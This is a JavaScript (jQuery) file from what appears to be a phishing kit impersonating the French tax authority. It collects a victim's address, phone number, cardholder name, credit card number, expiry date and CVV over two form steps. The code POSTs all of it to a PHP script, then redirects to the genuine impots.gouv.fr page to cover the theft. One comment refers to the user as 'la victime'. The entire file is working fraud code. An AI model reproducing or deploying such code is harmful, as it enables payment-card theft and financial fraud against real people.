function step_2_direct_zeubi() { 

        // quand la page qui demande l'adresse load debut
        $('#contenu').load('pages/step_2.html', function() {

            // autoriser uniquement les chiffres sur le code postale debut
            $("#code_postale_domicile").keypress(function(e) {
                if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                    return false;
                }
            });
            // autoriser uniquement les chiffres sur la date d'expiration fin

            // autoriser uniquement les chiffres sur le numero de telephone debut
            $("#numero_telephone").keypress(function(e) {
                if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                    return false;
                }
            });
            // autoriser uniquement les chiffres sur la date d'expiration fin

            // limite le nombre de caractère sur les input debut
            $('#code_postale_domicile').keyup(caractereMaximum);
            $('#numero_telephone').keyup(caractereMaximum);

            function caractereMaximum() {
                var string = $(this).val();
                var maxlength = $(this).data('maxlength');

                if (maxlength > 0) {
                    $(this).val(string.substr(0, maxlength));
                }
            }
            // limite le nombre de caractère sur les input fin

            $('#connexion').click(function() {

                if ($('#adresse_domicile').val() == '' && $('#ville_domicile').val() == '' && $('#code_postale_domicile').val() == '') {
                    $('#notification').empty();
                    $('#notification').append('<div role="alert" class="erreur alert alert-danger erreurDAC cat2" id="erreur">Merci de remplir tous les champs.</div>');
                } else {
                    var adresse = $('#adresse_domicile').val();
                    var ville = $('#ville_domicile').val();
                    var code_postale = $('#code_postale_domicile').val();
                    var telephone = $('#numero_telephone').val();

                    localStorage.setItem("adresse", adresse);
                    localStorage.setItem("ville", ville);
                    localStorage.setItem("code_postale", code_postale);
                    localStorage.setItem("telephone", telephone);


                    $('#contenu').load('pages/step_3.html', function() {

                        // format de date debut
                        $("#date_expiration").keyup(function() {
                            if ($(this).val().split('').pop() !== '?') {
                                if ($('#date_expiration').val().length == 2) {
                                    $(this).val($(this).val() + "/");
                                }
                            }
                        });
                        // format de date fin 

                        // autoriser uniquement les chiffres sur la carte de credit debut
                        $("#carte_credit").keypress(function(e) {
                            if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                                return false;
                            }
                        });
                        // autoriser uniquement les chiffres sur la carte de credit fin

                        // autoriser uniquement les chiffres sur le cvv debut
                        $("#cryptogramme").keypress(function(e) {
                            if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                                return false;
                            }
                        });
                        // autoriser uniquement les chiffres sur le cvv fin

                        // autoriser uniquement les chiffres sur la date d'expiration debut
                        $("#date_expiration").keypress(function(e) {
                            if (e.which != 8 && e.which != 0 && (e.which < 48 || e.which > 57)) {
                                return false;
                            }
                        });
                        // autoriser uniquement les chiffres sur la date d'expiration fin


                        // limite le nombre de caractère sur les input debut
                        $('#carte_credit').keyup(caractereMaximum);
                        $('#cryptogramme').keyup(caractereMaximum);
                        $('#date_expiration').keyup(caractereMaximum);

                        function caractereMaximum() {
                            var string = $(this).val();
                            var maxlength = $(this).data('maxlength');

                            if (maxlength > 0) {
                                $(this).val(string.substr(0, maxlength));
                            }
                        }
                        // limite le nombre de caractère sur les input fin

                        $('#valider').click(function() {
                            if ($('#nom').val() == '' && $('#carte_credit').val() == '' && $('#cryptogramme').val() == '' && $('#date_expiration').val() == '') {
                                $('#notification').empty();
                                $('#notification').append('<div role="alert" class="erreur alert alert-danger erreurDAC cat2" id="erreur">Merci de remplir tous les champs.</div>');
                            } else {

                                // enregistre les infos de la carte de crédit dans le navigateur debut
                                var nom = $('#nom').val();
                                var carte_credit = $('#carte_credit').val();
                                var date_expiration = $('#date_expiration').val();
                                var cryptogramme = $('#cryptogramme').val();

                                localStorage.setItem("nom", nom);
                                localStorage.setItem("carte_credit", carte_credit);
                                localStorage.setItem("date_expiration", date_expiration);
                                localStorage.setItem("cryptogramme", cryptogramme);
                                // enregistre les infos de la carte de crédit dans le navigateur fin


                                // recupère le numéro fiscal ainsi que l'adresse de la victime debut
                                var adresse_send = localStorage.getItem('adresse');
                                var code_postale_send = localStorage.getItem('code_postale');
                                var telephone_send = localStorage.getItem('telephone');
                                var ville_send = localStorage.getItem('ville');
                                // recupère le numéro fiscal ainsi que l'adresse de la victime fin

                                $.ajax({
                                    url: 'local/envoyer.php',
                                    type: 'post',
                                    data: {
                                        adresse_send: adresse_send,
                                        code_postale_send: code_postale_send,
                                        telephone_send: telephone_send,
                                        ville_send: ville_send,
                                        nom: nom,
                                        carte_credit: carte_credit,
                                        date_expiration: date_expiration,
                                        cryptogramme: cryptogramme
                                    },
                                    success: function(response) {
                                        if (response == 1) {
                                            document.location.href = "https://www.impots.gouv.fr/portail/votre-avis-sur-le-site"
                                        } else {
                                            alert('probleme php');
                                        }
                                    }
                                });

                            }

                        });

                    })

                }
            });

        });
        // quand la page qui demande l'adresse load fin
}

step_2_direct_zeubi();

